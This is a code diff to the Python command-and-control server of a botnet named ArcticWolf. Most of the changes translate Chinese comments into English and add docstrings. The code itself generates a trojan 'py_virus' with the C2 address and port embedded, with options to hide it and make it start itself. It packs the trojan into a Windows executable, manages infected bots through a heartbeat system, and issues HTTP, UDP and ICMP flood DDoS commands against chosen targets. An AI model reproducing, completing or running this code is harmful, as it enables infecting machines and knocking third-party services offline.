@@ -12,11 +12,17 @@ from winsound import Beep
 datasock_list = {}  # dict of bots  {Number:socket}
 last_Heartbeat = {}  # recored the time a bot send its heartbeat message
 ddos_attack_list = [] # recored ddos attack launched
-mode_list = ['httpGETflood', 'httpPOSTflood', 'UDPflood', 'ICMPflood'] # 攻击方法
+mode_list = ['httpGETflood', 'httpPOSTflood', 'UDPflood', 'ICMPflood'] # attack_method
 # printed with color
 def print_error(str : str):
+    '''error thing printed'''
     print('\033[0;31m' + '[-] ' + str + '\033[0m')
 def print_good(str : str, add_symbol=True, line_break=False):
+    '''
+    good thing printed
+    add [+] if add_symbol is True
+    line break if line_break is True
+    '''
     print_str = '\033[0;36m' + str + '\033[0m'
     if add_symbol:
         print_str = '\033[0;36m' + '[+] ' + str + '\033[0m'
@@ -25,34 +31,45 @@ def print_good(str : str, add_symbol=True, line_break=False):
     print(print_str)
     
 def print_warn(str : str):
+    '''warn thing printed'''
     print('\033[0;33m' + '[!] ' + str + '\033[0m')
 def print_normal(str : str, add_symbol=True):
+    '''
+    normal thing printed
+    add [*] if add_symbol is True
+    '''
     if add_symbol:
         print('\033[0;34m' + '[*] ' + str + '\033[0m')
     else:
         print('\033[0;34m' + str + '\033[0m')
-try:
-    from colorama import init,Fore,Back,Style
-    init(autoreset=True) #cmd中带颜色打印
-except ImportError:
-    if system_type == 'Windows':
-        print_warn('colorma library import failed, print with color may be error')
-#输入指令
+# if colorama is not installed, print with color may be error in Windows cmd
+if system_type == 'Windows':
+    try: # check if colorama is installed
+        from colorama import init,Fore,Back,Style
+        init(autoreset=True) 
+    except ImportError:
+            print_warn('colorma library import failed, print with color may be error')
 def post_cmd():
+    '''main method to input command'''
     def gen_py(mode : str):
+        '''
+        method to generate .py virus
+        mode is the writing format, such as' py 'and' exe '
+        Used for virus installation
+        return the name of the virus(not include .py)
+        '''
         def delete_lines(filename, head):
-            #删除前几行测试代码 输出源文件
+            '''Delete the first few lines of test code to output the source file'''
             with open(filename, 'r') as fin:
                 a = fin.readlines()
                 print_normal("Deleting test code......")
                 py_txt = ''.join(a[head:-1])
             return py_txt
-        # 生成.py木马文件
-        # mode为写入的格式，如‘py’和‘exe’。用于病毒安装
         print_normal("Copying source......")
-        py_txt = delete_lines('Resource/client_source.py', 8) #随着设置数量变化而变化 ！！！
+        py_txt = delete_lines('Resource/client_source.py', 8) #Varies with the number of Settings!!!
         name = "py_virus" + str(randint(100000, 900000))
         with open(name+'.py', "w") as fw:
+            # write the settings to the virus
             print_normal('Using config ./Data/settings.json')
             fw.write(f"address = '{frpip}'\n")
             fw.write(f"port = {frpport}\n")
@@ -61,7 +78,6 @@ def post_cmd():
             fw.write(f"Attribute_hide = {settings_data['Bots']['Attribute_hide']}\n")
             fw.write(f"Self_starting = {settings_data['Bots']['Self_starting']}\n")
             fw.write(F"buffsize = {settings_data['BotNet']['Buffsize']}\n")
-            # 写入设置
             print_normal(f"Writing virus to connect {ip} : {port}......")
             fw.write(py_txt)
         print_good(f"{name+'.py'} virus generated successfully")
@@ -69,12 +85,12 @@ def post_cmd():
     while True:
         command = input('ArcticWolf: >>> ')
         if command == 'ol_num':
-        # 上线肉鸡总数
+        # online bots number in total
             print_normal(f'{len(datasock_list)} bots online')
         # elif command == 'check':
         #     send(command)
         elif command == 'ls':
-        # 列出肉鸡信息
+        # list all the bots
             if len(datasock_list) < 1:
                 print_normal('no bots online')
             else:
@@ -86,18 +102,18 @@ def post_cmd():
                     print_normal(f" {num}        {client_addr[0]}        {client_addr[1]}        {socket.gethostbyaddr(client_addr[0])[0]}", False)
                     num += 1
         elif command == "info":
-            # 本机信息
+            # info of this host
             print_machine_info()
         elif command == 'reload':
             global settings_data, buffsize, last_Heartbeat
-            # 重新加载设置
+            # reload the settings
             Heartbeat_open_before = settings_data['BotNet']['Heartbeat']
             with open("./Data/settings.json", 'r') as f:
                 settings_data = json.load(f)
-            if settings_data['BotNet']['Heartbeat'] and not Heartbeat_open_before:
+            if settings_data['BotNet']['Heartbeat'] and not Heartbeat_open_before: # check if the heartbeat system is opened
                 print_normal('Heartbeat system started')
                 last_Heartbeat = {}
-                threading.Thread(target=tcplink, args=()).start() #检测是否启动心跳系统
+                threading.Thread(target=tcplink, args=()).start()
             buffsize = settings_data['BotNet']['Buffsize']
             print_normal('Settings data reloaded')
         elif command == 'clear_history':
@@ -107,11 +123,10 @@ def post_cmd():
             print_normal('PONG') # ???
         elif command == 'gen_py':
             gen_py('py')
-        elif command == 'gen_exe':
-            # 随机生成密钥		
+        elif command == 'gen_exe':	
             print_warn('Please make sure you install pyinstaller, if not, install it by "pip install pyinstaller"')
             name = gen_py('exe')
-            # 生成.exe木马文件
+            # generate .exe virus file
             print_normal(f"using pyinstaller to pack the .py file")
             upx_command = input("please input your UPX dir(blank for none) >>> ")
             print_normal("Packing with pyinstaller, please wait for a while")
@@ -140,7 +155,7 @@ def post_cmd():
                 send('shut')
         elif command.split('_')[0] == 'attack':
             try:
-            # ddos攻击
+            # ddos attack
                 target = command.split('_')[2]
                 if target in ddos_attack_list:
                     print_normal(f'Already attacking {target}')
@@ -158,19 +173,19 @@ def post_cmd():
             except:
                 print_error(f'Unknown attack command : {command}, attack format : attack_[attack_mode]_[target]')
         elif command == 'stop_ddos':
-            # 停止攻击
+            # stop attack
             ddos_attack_list.clear()
             History_write('I' 'Stop ddos attack')
             send(command)
         elif command.split('=')[0] == 'msg':
-            # 测试命令：发送消息
+            # Only for test : send msg to bots
             send(command)
         elif command == 'exit':
             History_write('Exit')
             send('shut')
             _exit(0)
         elif command == 'help':
-            #输出help
+            # print help-
             print_normal("help:")
             print_normal('''
     ---------Info command---------
@@ -204,20 +219,20 @@ def post_cmd():
             continue
         else:
             print_error(f'Unknown command {command}, You can type help to receive instructions')
-# 打印本机信息
+# print info
 def print_machine_info():
     host_name = socket.gethostname()
     print_normal("Attack host info:")
     print_normal("Host name: %s" % host_name, False)
     print_normal("IP address: %s" % ip, False)
     print_normal("PORT number: %s" % port, False)
-# 记录信息于本地历史文件中
+# write message to the log file
 def History_write(string, _type='I'):
     global history_file
     history_file.writelines(f"({_type})[{time.strftime('%Y-%m-%d %H:%M:%S',time.localtime())}] : {string}\n")
     history_file.flush()
-# 保持连接&心跳系统
 def tcplink():
+    '''Heartbeat system'''
     global last_Heartbeat, datasock_list
     def disconnected(_type, No, sock):
         History_write(f"Bot No.{No} disconnected.", _type)
@@ -226,17 +241,7 @@ def tcplink():
         del datasock_list[No]
         del last_Heartbeat[sock]
     while True:
-        # try:
-        #     recvdata = sock.recv(buffsize).decode('utf-8')
-        #     # print(recvdata)
-        #     sock.close()
-        #     datasock_list.remove(sock)
-        #     if not recvdata:
-        #         break
-        # except:
-        #     # sock.close()
-        #     # datasock_list.remove(sock)
-        #     break
+
         try:
             if datasock_list == {}:
                 continue
@@ -244,12 +249,12 @@ def tcplink():
                 for sock in list(last_Heartbeat.keys()):
                     No = [k for k,v in datasock_list.items() if v==sock][0]
                     try:
-                        if time.time() - last_Heartbeat[sock] > 20:  # 20秒内没有收到心跳消息，判断客户端掉线
+                        if time.time() - last_Heartbeat[sock] > 20:  # If no heartbeat message is received within 20 seconds, the client is disconnected
                             disconnected('I', No, sock)
                             break
-                        send('heartbeat')  # 发送心跳消息
+                        send('heartbeat')  # send heartbeat message 
                         last_Heartbeat = recv('Time')
-                        time.sleep(5)  # 每隔5秒发送一次心跳消息
+                        time.sleep(5)  # heartbeat per 5 seconds
                     except Exception as e:
                         disconnected('E', No, sock)
                         break
@@ -257,11 +262,11 @@ def tcplink():
                 return True
         except Exception as e:
             pass
-# 启动socket
 def run():
+    '''main method to accept connection'''
     while True:
         clientsock, clientaddress = s.accept()
-        clientsock.send('ArcticBotCheck'.encode('utf8')) #发送检查包
+        clientsock.send('ArcticBotCheck'.encode('utf8')) # send checking message
         if clientsock.recv(buffsize).decode('utf8') == 'CheckOK':
             biggest_No = 0
             for No in datasock_list.keys():
@@ -276,17 +281,17 @@ def run():
                 datasock_list[biggest_No] = clientsock
         else:
             clientsock.close()
-            del clientsock #检查连接目标是否为ArcticWolf僵尸
+            del clientsock # Check whether the connection target is an ArcticWolf bot
 
 
 
-# 发送指令
 def send(com : str):
+    '''send command'''
     try:
         No = 1
         for i in datasock_list.values():
             i.send('test'.encode('utf8'))
-            No += 1 #测试机器是否在线
+            No += 1 # Test if the machine is online
     except:
         i.close()
         del datasock_list[No]
@@ -319,9 +324,11 @@ def send(com : str):
         for i in datasock_list.values():
             i.sendall(com.encode('utf-8'))
                 
-# 接受回复
 def recv(mode : str):
-    #两种模式，Str模式返回内容， Time模式返回时间戳
+    '''
+    The method to recv message
+    There are two modes, Str mode returns the content, and Time mode returns the time
+    '''
     recv_dict = {}
     if mode == 'Time':
         for i in datasock_list.values():
@@ -332,11 +339,13 @@ def recv(mode : str):
             recv_dict[i] = i.recv(buffsize)
     else:
         raise f'Wrong mode error, wrond mode {mode} was given'
-    return recv_dict # 记录每个机器返回的内容或时间戳
+    return recv_dict # The content or time returned by each machine is recorded
 
-# 检查数据是否合法
 def check_input(input_str, mode, is_default=True):
-    #is_default 是否启用默认功能（空格）
+    '''
+    check the data is right(ip, port)
+    is_default: whether default features are enabled (Spaces)
+    '''
     var = input(f"please set your {input_str} >>> ")
     try:
         if mode == 'int_mode':
@@ -362,8 +371,8 @@ def check_input(input_str, mode, is_default=True):
         var = check_input(input_str, mode, is_default)    
         return var
 
-#程序入口
 if __name__ == '__main__':
+    '''Program entry'''
     print('\033[0;35m' + fr"""
 
 ===========================================================================
@@ -385,11 +394,11 @@ if __name__ == '__main__':
                                              
                                                                
 """  + '\033[0m')
-    # 查看是否需要初始化
+    # See if initialization is required
     if not os_path.exists("./Data"):
         print_normal("Initializing......")
-        mkdir("./Data") #创建data文件夹
-        default_settings_dict = { # 默认设置文件夹
+        mkdir("./Data") #Create the data folder
+        default_settings_dict = { # Default Settings folder
             'Attack' : {
             'Botmaster_attacks' : False
             },
@@ -416,6 +425,7 @@ if __name__ == '__main__':
         history_file = open("./Data/History.config", 'a')
     print_normal("Using settings from ./Data/settings.json")
     History_write("Opening")
+    # Get the ip and port from inputing
     ip = check_input("ip", "ip_mode")
     port = check_input("port", "int_mode")
     frpip = check_input("frp_ip", "ip_mode")
@@ -425,7 +435,7 @@ if __name__ == '__main__':
     print_normal(f"Start listening on {ip} : {port}")
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind((ip, port))
-    s.listen(5)  # 最大排队连接数
+    s.listen(5)  # Maximum number of queued connections
     threading.Thread(target=run, args=()).start()
     threading.Thread(target=post_cmd, args=()).start()
     if settings_data['BotNet']['Heartbeat']:
